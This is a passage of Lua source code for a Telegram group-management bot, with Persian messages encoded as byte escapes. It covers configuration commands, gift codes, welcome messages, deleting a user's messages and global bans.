              return "\216\174\216\167\217\133\217\136\216\180 \216\180\216\175"
            end
          elseif matches[2] == "19" then
            if matches[3]:lower() == "help" then
              return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\180\217\133\216\167\216\177\217\135 19:\n\216\168\216\167 \216\170\217\134\216\184\219\140\217\133 \218\169\216\177\216\175\217\134 \217\133\216\170\217\134 \216\168\216\177\216\167\219\140 \216\167\219\140\217\134 \216\180\217\133\216\167\216\177\217\135 \217\133\217\134\216\180\219\140 \216\174\217\136\216\175\218\169\216\167\216\177 \216\177\217\136\216\180\217\134 \216\174\217\136\216\167\217\135\216\175 \216\180\216\175 \217\136 \216\167\218\175\216\177 \217\133\216\170\217\134 \216\170\217\134\216\184\219\140\217\133 \216\180\216\175\217\135 \216\177\216\167 \216\168\217\135 off \216\170\216\186\219\140\219\140\216\177 \216\175\217\135\219\140\216\175 \217\133\217\134\216\180\219\140 \216\174\216\167\217\133\217\136\216\180 \216\174\217\136\216\167\217\135\216\175 \216\180\216\175"
            elseif matches[3] == "off" or matches[3] == "\216\174\216\167\217\133\217\136\216\180" then
              redis:del("EditBot:botmonshi")
              return "\217\133\217\134\216\180\219\140 \216\177\216\168\216\167\216\170 \216\174\216\167\217\133\217\136\216\180 \216\180\216\175"
            else
              redis:set("EditBot:botmonshi", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "20" then
            if matches[3]:lower() == "help" then
              return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\180\217\133\216\167\216\177\217\135 20:\n\216\178\217\133\216\167\217\134 \216\177\216\167 \216\168\217\135 \216\175\217\130\219\140\217\130\217\135 \217\136\216\167\216\177\216\175 \218\169\217\134\219\140\216\175"
            elseif string.match(matches[3], "(%d+)") then
              redis:set("EditBot:botmonshitime", tonumber(matches[3]))
              return "\216\178\217\133\216\167\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "21" then
            if matches[3]:lower() == "help" then
              return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\180\217\133\216\167\216\177\217\135 21:\n\216\168\216\177\216\167\219\140 \216\171\216\168\216\170 \218\169\216\167\217\134\216\167\217\132 \219\140\217\136\216\178\216\177\217\134\219\140\217\133 \216\162\217\134 \216\177\216\167 \216\168\216\167 @ \216\168\217\129\216\177\216\179\216\170\219\140\216\175 \219\140\216\167 \216\168\216\177\216\167\219\140 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\167\219\140\217\134 \217\130\216\167\216\168\217\132\219\140\216\170 \216\167\216\178 \218\169\217\132\217\133\217\135 off \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
            elseif matches[3]:lower() == "off" or matches[3] == "\216\174\216\167\217\133\217\136\216\180" then
              redis:del("EditBot:botchannel")
              return "\216\174\216\167\217\133\217\136\216\180 \216\180\216\175"
            elseif string.match(matches[3], "(@.*)") then
              redis:set("EditBot:botchannel", matches[3])
              return "\218\169\216\167\217\134\216\167\217\132 \216\171\216\168\216\170 \216\180\216\175"
            end
          elseif matches[2] == "22" then
            if matches[3]:lower() == "help" then
              return "\216\180\217\133\216\167\216\177\217\135 \217\136\216\167\216\177\216\175 \216\180\216\175\217\135 \216\177\216\167\217\135\217\134\217\133\216\167 \217\134\216\175\216\167\216\177\216\175!"
            else
              redis:set("EditBot:supportgp", matches[3])
              return "\218\175\216\177\217\136\217\135 \217\190\216\180\216\170\219\140\216\168\216\167\217\134\219\140 \216\171\216\168\216\170 \216\180\216\175"
            end
          elseif matches[2] == "23" then
            if matches[3]:lower() == "help" then
              return "\216\180\217\133\216\167\216\177\217\135 \217\136\216\167\216\177\216\175 \216\180\216\175\217\135 \216\177\216\167\217\135\217\134\217\133\216\167 \217\134\216\175\216\167\216\177\216\175!"
            elseif matches[3]:lower() == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:cmdsemoji")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:cmdsemoji", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "24" then
            if matches[3]:lower() == "help" then
              return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\180\217\133\216\167\216\177\217\135 24:\n\216\168\216\177\216\167\219\140 \216\170\216\186\219\140\219\140\216\177 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\167\216\178 reset text \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175 \217\136 \216\168\216\177\216\167\219\140 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\167\216\178 \216\180\218\169\217\132\218\169 \216\171\216\168\216\170 \216\180\216\175\217\135 \216\167\216\178 \218\169\217\132\217\133\217\135 EMJ \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
            elseif matches[3]:lower() == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:fahelpsudo")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:fahelpsudo", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "25" then
            if matches[3]:lower() == "help" then
              return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\180\217\133\216\167\216\177\217\135 25:\n\216\168\216\177\216\167\219\140 \216\170\216\186\219\140\219\140\216\177 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\167\216\178 reset text \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175 \217\136 \216\168\216\177\216\167\219\140 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\167\216\178 \216\180\218\169\217\132\218\169 \216\171\216\168\216\170 \216\180\216\175\217\135 \216\167\216\178 \218\169\217\132\217\133\217\135 EMJ \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
            elseif matches[3]:lower() == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:fahelpowner")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:fahelpowner", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "26" then
            if matches[3]:lower() == "help" then
              return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\180\217\133\216\167\216\177\217\135 26:\n\216\168\216\177\216\167\219\140 \216\170\216\186\219\140\219\140\216\177 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\167\216\178 reset text \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175 \217\136 \216\168\216\177\216\167\219\140 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\167\216\178 \216\180\218\169\217\132\218\169 \216\171\216\168\216\170 \216\180\216\175\217\135 \216\167\216\178 \218\169\217\132\217\133\217\135 EMJ \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
            elseif matches[3]:lower() == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:fahelpmods")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:fahelpmods", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "27" then
            if matches[3]:lower() == "help" then
              return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\180\217\133\216\167\216\177\217\135 27:\n\216\178\217\133\216\167\217\134 \216\177\216\167 \216\168\217\135 \216\175\217\130\219\140\217\130\217\135 \217\136\216\167\216\177\216\175 \218\169\217\134\219\140\216\175"
            elseif string.match(matches[3], "(%d+)") then
              redis:set("EditBot:timeinviter", tonumber(matches[3]))
              return "\216\178\217\133\216\167\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "28" then
            if matches[3]:lower() == "help" then
              return "\216\180\217\133\216\167\216\177\217\135 \217\136\216\167\216\177\216\175 \216\180\216\175\217\135 \216\177\216\167\217\135\217\134\217\133\216\167 \217\134\216\175\216\167\216\177\216\175!"
            elseif matches[3]:lower() == "reset text" or matches[3] == "\217\190\219\140\216\180\217\129\216\177\216\182" then
              redis:del("EditBot:facmdsemoji")
              return "\217\133\216\170\217\134 \216\168\217\135 \217\190\219\140\216\180\217\129\216\177\216\182 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
            else
              redis:set("EditBot:facmdsemoji", matches[3])
              return "\217\133\216\170\217\134 \216\167\216\177\216\179\216\167\217\132\219\140 \216\180\217\133\216\167 \216\172\216\167\219\140\218\175\216\178\219\140\217\134 \216\180\216\175"
            end
          elseif matches[2] == "29" then
            if matches[3]:lower() == "help" then
              return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\180\217\133\216\167\216\177\217\135 29:\n\216\168\216\177\216\167\219\140 \216\177\217\136\216\180\217\134 \218\169\216\177\216\175\217\134 \216\167\216\178 \218\169\217\132\217\133\217\135 on \217\136 \216\168\216\177\216\167\219\140 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\167\216\178 \218\169\217\132\217\133\217\135 off \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175\n\n\216\168\216\177\216\167\219\140 \216\170\216\186\219\140\219\140\216\177 \216\175\216\179\216\170\216\177\216\179\219\140 \216\168\217\135 \216\167\217\133\218\169\216\167\217\134\216\167\216\170 \216\170\217\129\216\177\219\140\216\173\219\140 \217\133\217\130\216\167\217\133 \217\133\217\136\216\177\216\175\217\134\216\184\216\177 \216\177\216\167 \217\136\216\167\216\177\216\175 \218\169\217\134\219\140\216\175:\nsudo = \216\179\217\136\216\175\217\136\nowner = \216\181\216\167\216\173\216\168\nmoderator = \217\133\216\175\219\140\216\177"
            elseif matches[3]:lower() == "off" or matches[3] == "\216\174\216\167\217\133\217\136\216\180" then
              redis:del("EditBot:funtools")
              return "\216\167\217\133\218\169\216\167\217\134\216\167\216\170 \216\170\217\129\216\177\219\140\216\173\219\140 \216\177\216\168\216\167\216\170 \216\174\216\167\217\133\217\136\216\180 \216\180\216\175"
            elseif matches[3]:lower() == "on" or matches[3] == "\216\177\217\136\216\180\217\134" then
              redis:set("EditBot:funtools", "all")
              return "\216\167\217\133\218\169\216\167\217\134\216\167\216\170 \216\170\217\129\216\177\219\140\216\173\219\140 \216\177\216\168\216\167\216\170 \216\177\217\136\216\180\217\134 \216\180\216\175"
            elseif matches[3]:lower() == "sudo" or matches[3] == "\216\179\217\136\216\175\217\136" then
              redis:set("EditBot:funtools", "sudo")
              return "\216\167\217\133\218\169\216\167\217\134\216\167\216\170 \216\170\217\129\216\177\219\140\216\173\219\140 \216\177\216\168\216\167\216\170 \216\168\216\167 \216\175\216\179\216\170\216\177\216\179\219\140 \216\179\217\136\216\175\217\136 \216\177\217\136\216\180\217\134 \216\180\216\175"
            elseif matches[3]:lower() == "owner" or matches[3] == "\216\181\216\167\216\173\216\168" then
              redis:set("EditBot:funtools", "owner")
              return "\216\167\217\133\218\169\216\167\217\134\216\167\216\170 \216\170\217\129\216\177\219\140\216\173\219\140 \216\177\216\168\216\167\216\170 \216\168\216\167 \216\175\216\179\216\170\216\177\216\179\219\140 \216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135 \216\177\217\136\216\180\217\134 \216\180\216\175"
            elseif matches[3]:lower() == "moderator" or matches[3] == "\217\133\216\175\219\140\216\177" then
              redis:set("EditBot:funtools", "moderator")
              return "\216\167\217\133\218\169\216\167\217\134\216\167\216\170 \216\170\217\129\216\177\219\140\216\173\219\140 \216\177\216\168\216\167\216\170 \216\168\216\167 \216\175\216\179\216\170\216\177\216\179\219\140 \217\133\216\175\219\140\216\177 \218\175\216\177\217\136\217\135 \216\177\217\136\216\180\217\134 \216\180\216\175"
            end
          elseif matches[2] == "30" then
            if matches[3]:lower() == "help" then
              return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\180\217\133\216\167\216\177\217\135 30:\n\216\168\216\177\216\167\219\140 \217\129\216\185\216\167\217\132 \218\169\216\177\216\175\217\134 \216\167\219\140\217\134 \218\175\216\178\219\140\217\134\217\135 \216\167\216\178 on \217\136 \216\168\216\177\216\167\219\140 \216\186\219\140\216\177\217\129\216\185\216\167\217\132 \218\169\216\177\216\175\217\134 \216\167\219\140\217\134 \218\175\216\178\219\140\217\134\217\135 \216\167\216\178 off \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
            elseif matches[3] == "on" or matches[3] == "\216\177\217\136\216\180\217\134" then
              redis:set("EditBot:closememberaccess", true)
              return "\216\175\216\179\216\170\216\177\216\179\219\140 \216\167\216\185\216\182\216\167 \217\133\216\185\217\133\217\136\217\132\219\140 \216\168\217\135 \216\177\216\168\216\167\216\170 \216\168\216\179\216\170\217\135 \216\180\216\175"
            elseif matches[3] == "off" or matches[3] == "\216\174\216\167\217\133\217\136\216\180" then
              redis:del("EditBot:closememberaccess")
              return "\216\175\216\179\216\170\216\177\216\179\219\140 \216\168\217\135 \216\177\216\168\216\167\216\170 \216\168\216\177\216\167\219\140 \216\167\216\185\216\182\216\167 \217\133\216\185\217\133\217\136\217\132\219\140 \216\162\216\178\216\167\216\175 \216\180\216\175"
            end
          elseif matches[2] == "31" then
            if matches[3]:lower() == "help" then
              return "\216\177\216\167\217\135\217\134\217\133\216\167 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135 \216\180\217\133\216\167\216\177\217\135 31:\n\216\168\216\177\216\167\219\140 \216\177\217\136\216\180\217\134 \218\169\216\177\216\175\217\134 \216\167\216\178 \218\169\217\132\217\133\217\135 on \217\136 \216\168\216\177\216\167\219\140 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\167\216\178 \218\169\217\132\217\133\217\135 off \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
            elseif matches[3]:lower() == "off" or matches[3] == "\216\174\216\167\217\133\217\136\216\180" then
              redis:set("EditBot:autopromote", true)
              return "\216\167\216\177\216\170\217\130\216\167 \216\174\217\136\216\175\218\169\216\167\216\177 \216\174\216\167\217\133\217\136\216\180 \216\180\216\175"
            elseif matches[3]:lower() == "on" or matches[3] == "\216\177\217\136\216\180\217\134" then
              redis:del("EditBot:autopromote")
              return "\216\167\216\177\216\170\217\130\216\167 \216\174\217\136\216\175\218\169\216\167\216\177 \216\177\217\136\216\180\217\134 \216\180\216\175"
            end
          end
        end
      end
    end
    if (matches[1]:lower() == "setrank" or matches[1]:lower() == "\216\170\217\134\216\184\219\140\217\133 \216\177\217\134\218\169") and is_owner(msg) then
      function SetRank(extra, result, success)
        user = result.sender_user_id_
        chat = result.chat_id_
        redis:set("GetRankForUser:" .. user .. ":" .. chat, matches[2])
        print("User: " .. user .. [[

Chat: ]] .. chat .. [[

Rank: ]] .. matches[2])
        if not lang then
          tdcli.sendMessage(chat, 0, 0, "*Users* " .. user .. " *Rank Has Been Set To:* " .. matches[2], 0, "md")
        else
          tdcli.sendMessage(chat, 0, 0, "\216\177\217\134\218\169 \218\169\216\167\216\177\216\168\216\177 " .. user .. " \216\170\217\134\216\184\219\140\217\133 \216\180\216\175 \216\168\217\135: " .. matches[2], 0, "md")
        end
      end
      tdcli_function({
        ID = "GetMessage",
        chat_id_ = msg.to.id,
        message_id_ = msg.reply_to_message_id_
      }, SetRank, nil)
    end
    if (matches[1]:lower() == "gift" or matches[1] == "\217\135\216\175\219\140\217\135") and is_mod(msg) then
      if redis:get("BotAddedGift:" .. matches[2]) then
        GiftDay = tonumber(redis:get("BotAddedGift:" .. matches[2]))
        CurrentSec = tonumber(redis:ttl("ExpireDate:" .. msg.to.id)) or 0
        CurrentDay = math.ceil(CurrentSec / 86400)
        NextDay = CurrentDay + GiftDay
        NextSec = NextDay * 86400
        redis:setex("ExpireDate:" .. msg.to.id, NextSec, true)
        if not redis:get("CheckExpire:" .. msg.to.id) then
          redis:set("CheckExpire:" .. msg.to.id, true)
        end
        if not lang then
          tdcli.sendMessage(msg.to.id, msg.id_, 0, [[
Done
Gift Added `]] .. GiftDay .. "` Day To Your Group", 0, "md")
        else
          tdcli.sendMessage(msg.to.id, msg.id_, 0, "\216\167\217\134\216\172\216\167\217\133 \216\180\216\175\n\217\135\216\175\219\140\217\135 \217\133\217\136\216\177\216\175\217\134\216\184\216\177 `" .. GiftDay .. "` \216\177\217\136\216\178 \216\168\217\135 \216\180\216\167\216\177\218\152 \218\175\216\177\217\136\217\135 \216\180\217\133\216\167 \216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175", 0, "md")
        end
        for v, owner in pairs(_config.bot_owner) do
          if msg.from.username then
            UserName = "@" .. msg.from.username
          else
            UserName = msg.from.first_name
          end
          tdcli.sendMessage(tonumber(owner), 0, 1, "\218\169\216\175 \217\135\216\175\219\140\217\135 `" .. matches[2] .. "` \216\170\217\136\216\179\216\183 " .. UseMark(UserName) .. " \216\168\216\177\216\167\219\140 \218\175\216\177\217\136\217\135 " .. msg.to.id .. " \217\133\217\136\216\177\216\175 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \217\130\216\177\216\167\216\177 \218\175\216\177\217\129\216\170", 1, "md")
        end
        redis:del("BotAddedGift:" .. matches[2])
      elseif not lang then
        return "Gift Not Found or Used By an other Group!"
      else
        return "\217\135\216\175\219\140\217\135 \217\133\217\136\216\177\216\175\217\134\216\184\216\177 \217\190\219\140\216\175\216\167 \217\134\216\180\216\175 \219\140\216\167 \216\170\217\136\216\179\216\183 \218\175\216\177\217\136\217\135 \216\175\219\140\218\175\216\177 \217\133\217\136\216\177\216\175 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \217\130\216\177\216\167\216\177 \218\175\216\177\217\129\216\170\217\135 \216\167\216\179\216\170!"
      end
    end
    if (matches[1]:lower() == "addgift" or matches[1] == "\216\179\216\167\216\174\216\170 \217\135\216\175\219\140\217\135") and is_sudo(msg) then
      if not redis:sismember("SudoAccess" .. msg.from.id, "addgift") and is_sudo(msg) and not is_botOwner(msg) then
        if not lang then
          return ErrorAccessSudo(msg)
        else
          return ErrorAccessSudo(msg)
        end
      end
      redis:set("WaitForAddGift:" .. msg.from.id .. ":" .. msg.to.id, matches[2])
      return "\217\133\219\140\216\174\217\136\216\167\217\135\219\140\216\175 \216\167\219\140\217\134 \217\135\216\175\219\140\217\135 \218\134\217\134\216\175 \216\177\217\136\216\178 \216\168\217\135 \216\180\216\167\216\177\218\152 \218\175\216\177\217\136\217\135 \216\167\216\182\216\167\217\129\217\135 \218\169\217\134\216\175\216\159 (\216\168\216\177\216\167\219\140 \217\132\216\186\217\136 \216\167\216\178 cancel \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175)"
    end
    if (matches[1]:lower() == "manager" or matches[1] == "\217\133\216\175\219\140\216\177\219\140\216\170") and is_mod(msg) then
      local channel = redis:get("EditBot:botchannel")
      if channel then
        https = require("ssl.https")
        local url, res = https.request("https://api.telegram.org/bot" .. _config.Token .. "/getchatmember?chat_id=" .. channel .. "&user_id=" .. msg.from.id)
        data = json:decode(url)
        if data.description == "Bad Request: CHAT_ADMIN_REQUIRED" then
          if not lang then
            return "Helper Bot is Not Channel Admin!"
          else
            return "\216\177\216\168\216\167\216\170 \218\169\217\133\218\169\219\140 \217\133\216\175\219\140\216\177 \218\169\216\167\217\134\216\167\217\132 \217\134\219\140\216\179\216\170!"
          end
        elseif res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
          GetHelper(msg, msg.to.id .. "2222")
        elseif data.ok then
          GetHelper(msg, msg.to.id .. "1111")
        end
      else
        GetHelper(msg, msg.to.id .. "1111")
      end
    end
    if (matches[1]:lower() == "welcome" or matches[1] == "\216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140") and is_mod(msg) then
      if matches[2] == "enable" or matches[2] == "on" or matches[2] == "\216\177\217\136\216\180\217\134" then
        welcome = redis:get("SettingsWelcomeFor" .. msg.to.id)
        if welcome then
          if not lang then
            return [[
*Group welcome* 
*Status:* `Already Enabled`]]
          elseif lang then
            return "*\216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140 \218\175\216\177\217\136\217\135* \n*\217\136\216\182\216\185\219\140\216\170:* `\217\135\217\133 \216\167\218\169\217\134\217\136\217\134 \217\129\216\185\216\167\217\132 \217\133\219\140 \216\168\216\167\216\180\216\175`"
          end
        else
          redis:set("SettingsWelcomeFor" .. msg.to.id, true)
          if not lang then
            return [[
*Group welcome* 
*Status:* `Enabled`]]
          elseif lang then
            return "*\216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140 \218\175\216\177\217\136\217\135* \n*\217\136\216\182\216\185\219\140\216\170:* `\217\129\216\185\216\167\217\132 \216\180\216\175`"
          end
        end
      end
      if matches[2] == "disable" or matches[2] == "off" or matches[2] == "\216\174\216\167\217\133\217\136\216\180" then
        welcome = redis:get("SettingsWelcomeFor" .. msg.to.id)
        if not welcome then
          if not lang then
            return [[
*Group Welcome* 
*Status:* `Not Enabled`]]
          elseif lang then
            return "*\216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140 \218\175\216\177\217\136\217\135* \n*\217\136\216\182\216\185\219\140\216\170:* `\217\129\216\185\216\167\217\132 \217\134\219\140\216\179\216\170`"
          end
        else
          redis:del("SettingsWelcomeFor" .. msg.to.id)
          if not lang then
            return [[
*Group welcome* 
*Status:* `Disabled`]]
          elseif lang then
            return "*\216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140 \218\175\216\177\217\136\217\135* \n*\217\136\216\182\216\185\219\140\216\170:* `\216\186\219\140\216\177 \217\129\216\185\216\167\217\132 \216\180\216\175`"
          end
        end
      end
    end
    if (matches[1]:lower() == "setwelcome" or matches[1] == "\216\170\217\134\216\184\219\140\217\133 \216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140") and is_mod(msg) then
      Wlc = UseMark(matches[2])
      redis:set("GroupWelcome" .. msg.to.id, Wlc)
      if not lang then
        tdcli.sendMessage(msg.chat_id_, 0, 1, "Group welcome has been changed to:\n" .. Wlc, 1)
      else
        tdcli.sendMessage(msg.chat_id_, 0, 1, "\216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\217\138\217\138 \218\175\216\177\217\136\217\135 \216\170\216\186\217\138\217\138\216\177 \218\169\216\177\216\175 \216\168\217\135:\n" .. Wlc, 1)
      end
    end
  end
  local userid = tonumber(matches[2])
  local hash = "gp_lang:" .. msg.to.id
  local lang = redis:get(hash)
  local data = load_data("./data/moderation.json")
  chat = msg.to.id
  user = msg.from.id
  if msg.to.type ~= "pv" and (matches[1]:lower() == "delall" or matches[1] == "\216\173\216\176\217\129 \217\135\217\133\217\135 \217\190\219\140\216\167\217\133 \217\135\216\167") and is_mod(msg) then
    if not matches[2] and msg.reply_id then
      tdcli_function({
        ID = "GetMessage",
        chat_id_ = msg.to.id,
        message_id_ = msg.reply_id
      }, action_by_reply_, {
        chat_id = msg.to.id,
        cmd = "delall"
      })
    end
    if matches[2] and string.match(matches[2], "^%d+$") then
      if isModerator(msg.to.id, userid) then
        return NoAccess(msg.to.id)
      else
        tdcli.deleteMessagesFromUser(msg.to.id, matches[2], dl_cb, nil)
        return SendStatus(msg.to.id, matches[2], "All Messages Deleted!", "\217\135\217\133\217\135 \217\190\219\140\216\167\217\133 \217\135\216\167 \217\190\216\167\218\169 \216\180\216\175\217\134\216\175!")
      end
    end
    if matches[2] and not string.match(matches[2], "^%d+$") then
      tdcli_function({
        ID = "SearchPublicChat",
        username_ = matches[2]
      }, action_by_username_, {
        chat_id = msg.to.id,
        username = matches[2],
        cmd = "delall"
      })
    end
  end
  if (matches[1]:lower() == "banall" or matches[1] == "\218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134") and is_sudo(msg) then
    if not redis:sismember("SudoAccess" .. msg.from.id, "banall") and is_sudo(msg) and not is_botOwner(msg) then
      if not lang then
        return ErrorAccessSudo(msg)
      else
        return ErrorAccessSudo(msg)
      end
    end
    if not matches[2] and msg.reply_id then
      function BanAll(extra, result, success)
        if result.sender_user_id_ then
          user = result.sender_user_id_
          chat = result.chat_id_
          if CheckBotRank(user) then
            return NoAccess(chat)
          end
          if is_banall(user) then
            return SendStatus(chat, user, "Already Globall Banned", "\216\167\216\178 \217\130\216\168\217\132 \218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \216\168\217\136\216\175")
          end
          redis:sadd("BotGloballBanUsers", user)
          kick_user(user, chat)
          return SendStatus(chat, user, "Globall Banned", "\218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \216\180\216\175")
        end
      end
      tdcli_function({
        ID = "GetMessage",
        chat_id_ = msg.to.id,
        message_id_ = msg.reply_to_message_id_
      }, BanAll, nil)
    end
    if matches[2] and string.match(matches[2], "^%d+$") then
      local get = function(extra, result, success)
        if result.id_ then
          user = result.id_
          chat = msg.to.id
          if CheckBotRank(user) then
            return NoAccess(msg.to.id)
          end
          if is_banall(user) then
            return SendStatus(msg.to.id, user, "Already Globall Banned", "\216\167\216\178 \217\130\216\168\217\132 \218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \216\168\217\136\216\175")
          end
          redis:sadd("BotGloballBanUsers", user)
          kick_user(user, msg.to.id)
          return SendStatus(msg.to.id, user, "Globall Banned", "\218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \216\180\216\175")
        else
          user = matches[2]
          chat = msg.to.id
          if redis:sismember("BotGloballBanUsers", user) then
            return SendStatusNotFound(chat, user, "Already Globall Banned", "\216\167\216\178 \217\130\216\168\217\132 \218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \216\168\217\136\216\175")
          else
            redis:sadd("BotGloballBanUsers", user)
            kick_user(user, msg.to.id)
            return SendStatusNotFound(chat, user, "Globall Banned", "\218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \216\180\216\175")
          end
        end
      end
      tdcli.getUser(matches[2], get)
    end
    if matches[2] and string.match(matches[2], "^@.*$") then
      function BanAll(arg, data)
        if data.id_ then
          user = data.id_
          chat = arg.chat_id
          if CheckBotRank(user) then
            return NoAccess(chat)
          end
          if is_banall(user) then
            return SendStatus(chat, user, "Already Globall Banned", "\216\167\216\178 \217\130\216\168\217\132 \218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \216\168\217\136\216\175")
          end
          redis:sadd("BotGloballBanUsers", user)
          kick_user(user, chat)
          return SendStatus(chat, user, "Globall Banned", "\218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \216\180\216\175")
        else
          user = arg.username
          chat = arg.chat_id
          if redis:sismember("BotGloballBanUsers", user) then
            return SendStatusNotFound(chat, user, "Already Globall Banned", "\216\167\216\178 \217\130\216\168\217\132 \218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \216\168\217\136\216\175")
          else
            redis:sadd("BotGloballBanUsers", user)
            kick_user(user, chat)
            return SendStatusNotFound(chat, user, "Globall Banned", "\218\175\217\132\217\136\216\168\216\167\217\132 \216\168\217\134 \216\180\216\175")
          end
        end
      end
      tdcli_function({
        ID = "SearchPublicChat",
        username_ = matches[2]
      }, BanAll, {
        chat_id = msg.to.id,
        username = matches[2]
      })
    end
  end
  if (matches[1]:lower() == "unbanall" or matches[1] == "\218\175\217\132\217\136\216\168\216\167\217\132 \216\162\217\134\216\168\217\134") and is_sudo(msg) then
    if not redis:sismember("SudoAccess" .. msg.from.id, "unbanall") and is_sudo(msg) and not is_botOwner(msg) then
